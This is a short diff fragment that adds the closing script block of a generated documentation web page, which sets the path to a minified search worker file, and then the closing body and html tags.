+          search: Object.assign({
+            worker: "../../../assets/javascripts/worker/search.4ac00218.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
